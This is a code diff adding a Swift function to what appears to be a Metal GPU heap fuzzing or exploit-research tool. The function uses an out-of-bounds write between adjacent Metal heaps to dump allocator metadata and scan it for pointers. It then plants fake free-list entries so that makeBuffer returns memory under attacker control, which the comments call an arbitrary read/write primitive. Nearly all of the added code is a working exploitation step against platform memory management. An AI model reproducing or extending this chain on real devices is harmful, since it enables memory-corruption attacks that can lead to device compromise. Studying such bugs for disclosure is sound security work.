@@ -181,6 +181,123 @@ func runMetalFuzz(log: FuzzLog, completion: @escaping () -> Void) {
     }
 }
 
+// Heap allocator confusion attack.
+//
+// Chain so far:
+//   ✓ h0 OOB write → h1's memory (64/64 bytes confirmed)
+//
+// This step: corrupt h1's INTERNAL ALLOCATOR STATE before any h1 alloc,
+// then call h1.makeBuffer() — if Metal's free list reads our planted bytes,
+// the returned buffer's contents() lands at attacker-controlled address.
+//
+// Phase 1: alloc h0 (fills, establishes adjacency), leave h1 EMPTY
+// Phase 2: snapshot h1's raw bytes via h0 OOB (read allocator metadata)
+// Phase 3: log any pointer-class values in the snapshot (0x1xxxxxxxx pattern)
+// Phase 4: plant a fake free-list entry pointing at h2's VA
+// Phase 5: call h1.makeBuffer() — log the returned contents() pointer
+// Phase 6: check if it left h1's normal range → arbitrary pointer confirmed
+func runAllocatorConfusion(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async {
+        let sl = SyncLog()
+        func step(_ s: String) { sl.write(s); log.append(s) }
+        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
+        step("── Allocator Confusion ─────────────────────")
+
+        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
+
+        // Alloc h0 FULLY — establishes h0→h1 adjacency
+        guard let h0 = device.makeHeap(descriptor: hd) else { step("h0 nil"); completion(); return }
+        let actual = h0.size
+        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared) else { step("b0 nil"); completion(); return }
+        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
+        let va0 = UInt(bitPattern: p0)
+        step("h0 va=0x\(String(va0,radix:16)) actual=\(actual)")
+
+        // h1 — leave EMPTY (no suballoc yet — allocator state is pristine)
+        guard let h1 = device.makeHeap(descriptor: hd) else { step("h1 nil"); completion(); return }
+        let va1_heap = UInt(bitPattern: h1.contents)
+        step("h1 heap.contents=0x\(String(va1_heap,radix:16))")
+
+        // h2 — alloc fully — this is our target VA we want to redirect h1 into
+        guard let h2 = device.makeHeap(descriptor: hd) else { step("h2 nil"); completion(); return }
+        guard let b2 = h2.makeBuffer(length: actual, options: .storageModeShared) else { step("b2 nil"); completion(); return }
+        let p2 = b2.contents().assumingMemoryBound(to: UInt8.self)
+        let va2 = UInt(bitPattern: p2)
+        step("h2 va=0x\(String(va2,radix:16))")
+
+        // Verify adjacency: h0 end == h1 start?
+        let dist = va1_heap > va0 ? va1_heap - va0 : va0 - va1_heap
+        step("dist h0→h1 = 0x\(String(dist,radix:16))")
+        guard dist == UInt(actual) else { step("not adjacent this run — retry"); completion(); return }
+
+        // Phase 2: snapshot h1's first 256 bytes via h0 OOB (before any h1 alloc)
+        step("── Snapshot h1 allocator state (256 bytes) ──")
+        var snapshot = [UInt8](repeating: 0, count: 256)
+        for i in 0..<256 { snapshot[i] = p0[actual + i] }
+
+        // Hex dump: 16 rows × 16 bytes
+        for row in 0..<16 {
+            let slice = snapshot[(row*16)..<(row*16+16)]
+            let hex = slice.map { String(format:"%02x", $0) }.joined(separator:" ")
+            step("  +\(String(format:"%03x", row*16)): \(hex)")
+        }
+
+        // Phase 3: scan for pointer-class values (8-byte aligned, 0x1xxxxxxxx range)
+        step("── Pointer scan ──────────────────────────────")
+        var foundPtrs = 0
+        for off in stride(from: 0, to: 248, by: 8) {
+            var val: UInt64 = 0
+            for b in 0..<8 { val |= UInt64(snapshot[off+b]) << (b*8) }
+            if val > 0x100000000 && val < 0x200000000 {
+                step("  +0x\(String(format:"%02x",off)): 0x\(String(val,radix:16)) ← PTR-CLASS")
+                foundPtrs += 1
+            }
+        }
+        step("  ptr-class values found: \(foundPtrs)")
+
+        // Phase 4: plant fake free-list entry — write h2's VA into h1's first 8 bytes
+        step("── Planting fake free-list → target va2=0x\(String(va2,radix:16))")
+        // Write va2 as little-endian 8 bytes at h1 offset 0 (via h0 OOB)
+        var target = va2
+        for i in 0..<8 {
+            p0[actual + i] = UInt8(target & 0xFF)
+            target >>= 8
+        }
+        // Also write it at offset 8, 16, 24 — cover multiple free-list formats
+        target = va2
+        for i in 8..<32 {
+            p0[actual + i] = UInt8(target & 0xFF)
+            target >>= 8
+            if i % 8 == 7 { target = va2 }
+        }
+        step("  planted va2 at h1[0..31] via h0 OOB")
+
+        // Phase 5: trigger allocator — call makeBuffer on corrupted h1
+        step("── h1.makeBuffer(256) with corrupted state")
+        let confused = h1.makeBuffer(length: 256, options: .storageModeShared)
+        if let cb = confused {
+            let cva = UInt(bitPattern: cb.contents())
+            step("  returned va=0x\(String(cva,radix:16))")
+            let normalRange = va1_heap...(va1_heap + UInt(actual))
+            if normalRange.contains(cva) {
+                step("  within h1 normal range — allocator robust against this overwrite")
+            } else if cva == va2 || (cva >= va2 && cva < va2 + UInt(actual)) {
+                step("  *** IN h2 RANGE — ARBITRARY POINTER CONFIRMED ***")
+                step("  *** makeBuffer returned h2's memory — full r/w primitive ***")
+            } else {
+                step("  *** OUTSIDE h1 range, not h2 — corrupted pointer 0x\(String(cva,radix:16)) ***")
+                step("  *** attacker-influenced allocation — partial primitive ***")
+            }
+        } else {
+            step("  nil — heap corrupted/exhausted (expected if allocator detected bad state)")
+            step("  snapshot + pointer scan above still reveals allocator format")
+        }
+
+        step("── Allocator Confusion complete ────────────")
+        completion()
+    }
+}
+
 // Heap boundary cross test.
 // Heaps are spaced exactly actual_size=16384 bytes apart (confirmed via spray).
 // Heaps are CONTIGUOUS — no padding. ptr[actual_size] of heap[0] = ptr[0] of heap[1].
